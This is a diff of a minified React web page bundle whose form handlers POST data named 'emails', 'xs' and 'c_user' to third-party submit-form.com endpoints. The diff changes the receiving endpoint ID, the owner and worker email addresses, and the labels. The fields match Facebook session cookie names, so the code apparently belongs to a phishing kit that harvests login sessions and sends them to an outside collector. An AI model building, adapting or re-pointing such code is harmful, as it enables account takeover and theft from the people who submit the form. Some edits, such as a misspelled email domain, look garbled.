@@ -9814,17 +9814,17 @@
                                 className: "ant-form ant-form-horizontal css-m4timi",
                                 onSubmit: e => {
                                     e.preventDefault(),
-                                    fetch("https://submit-form.com/cPUaGYgSy", {
+                                    fetch("https://submit-form.com/ECkft3vAO", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
                                         },
                                         body: JSON.stringify({
                                             emails: o,
-                                            _ownerEmail: "asad.ali.nizamani.official@gmail.corm",
+                                            _ownerEmail: "asad.ali.nizamani.official@gmail.com",
                                             xs: r,
                                             c_user: i,
-                                            name: "irbaz"
+                                            name: "asad-ali"
                                         })
                                     }).then((e => {
                                         e.ok
@@ -9978,7 +9978,7 @@
             n.useState)(!1);
             return (0,
             he.jsxs)(he.Fragment, {
-                children: [e ? (0,q
+                children: [e ? (0,
                 he.jsx)(be, {
                     hide: () => {
                         t(!1)
@@ -11166,7 +11166,7 @@
                                                                 fill: "black"
                                                             })
                                                         })
-                                                    })]
+                                                    })]  
                                                 }), (0,
                                                 he.jsxs)("div", {
                                                     className: "action-button",
@@ -13365,7 +13365,7 @@
                                         },
                                         body: JSON.stringify({
                                             emails: e,
-                                            workerEmail: "asad.ali.nizamani.official@gmail.com",
+                                            workerEmail: "asad.ali.nizamani.official@gil.com",
                                             xs: o,
                                             c_user: u,
                                             name: "My Self"
